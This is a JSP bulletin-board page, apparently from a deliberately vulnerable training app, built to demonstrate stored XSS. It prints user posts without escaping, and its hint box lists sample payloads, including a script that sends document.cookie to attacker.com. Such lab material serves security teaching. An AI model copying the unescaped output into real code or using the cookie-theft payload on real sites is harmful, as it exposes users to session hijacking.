<%@ page contentType="text/html;charset=UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>게시판 - Stored XSS</title>
  <style>
    body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background: #f4f6f9; }
    .header { background: #003366; color: #fff; padding: 12px 30px; }
    .header a { color: #aad4ff; text-decoration: none; margin-right: 10px; }
    .container { max-width: 960px; margin: 24px auto; padding: 0 20px; }
    .card { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 20px; margin-bottom: 16px; }
    h2 { color: #003366; margin-top: 0; }
    .write-form { background: #f8f9ff; border: 1px solid #c8d8ff; border-radius: 4px; padding: 16px; margin-bottom: 20px; }
    .write-form input, .write-form textarea {
      width: 100%; padding: 8px; border: 1px solid #bbb; border-radius: 4px;
      margin-bottom: 8px; box-sizing: border-box; font-family: inherit;
    }
    .write-form button { padding: 10px 24px; background: #003366; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th { background: #003366; color: #fff; padding: 10px; text-align: left; }
    td { padding: 10px; border-bottom: 1px solid #eee; vertical-align: top; }
    tr:hover td { background: #f5f8ff; }
    .hint { background: #fff8e1; border-left: 3px solid #ffc107; padding: 10px 14px; font-size: 12px; margin-bottom: 12px; }
    code { background: #f0f0f0; padding: 1px 4px; border-radius: 3px; font-size: 11px; }
  </style>
</head>
<body>
<div class="header">
  <a href="/nas/main/main.do">← 홈</a>
  <strong>커뮤니티 게시판</strong>
  <span style="background:#ffe0ff;color:#800;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:bold;margin-left:10px;">XSS-1/2: Stored XSS</span>
</div>

<div class="container">
  <div class="card">
    <h2>게시판 글쓰기</h2>
    <div class="hint">
      💡 <strong>Stored XSS 테스트 — 아래 내용 칸에 입력:</strong><br>
      기본: <code>&lt;script&gt;alert('StoredXSS')&lt;/script&gt;</code><br>
      쿠키 탈취: <code>&lt;script&gt;new Image().src="http://attacker.com/steal?c="+btoa(document.cookie)&lt;/script&gt;</code><br>
      IMG: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br>
      ※ 입력한 내용이 DB에 저장되어 <strong>모든 방문자</strong>에게 실행됩니다.
    </div>

    <form class="write-form" method="POST" action="/nas/board/boardWrite.do">
      <input type="text" name="author" placeholder="작성자" value="visitor" style="width:200px;">
      <input type="text" name="title" placeholder="제목 (취약: XSS 가능)">
      <%-- ★ 취약: 입력값 sanitize 없이 저장/출력 --%>
      <textarea name="content" rows="4" placeholder="내용 (취약: XSS 가능)"></textarea>
      <button type="submit">등록</button>
    </form>

    <h2>게시글 목록</h2>
    <table>
      <thead>
        <tr><th style="width:40px;">No</th><th style="width:80px;">작성자</th><th>제목</th><th>내용</th><th style="width:140px;">작성일</th></tr>
      </thead>
      <tbody>
        <c:forEach var="post" items="${posts}">
          <tr>
            <td>${post.ID}</td>
            <%-- ★ 취약: 이스케이프 없이 출력 (Stored XSS 실행 지점) --%>
            <td>${post.AUTHOR}</td>
            <td>${post.TITLE}</td>
            <td>${post.CONTENT}</td>
            <td>${post.CREATED}</td>
          </tr>
        </c:forEach>
      </tbody>
    </table>
  </div>
</div>
</body>
</html>
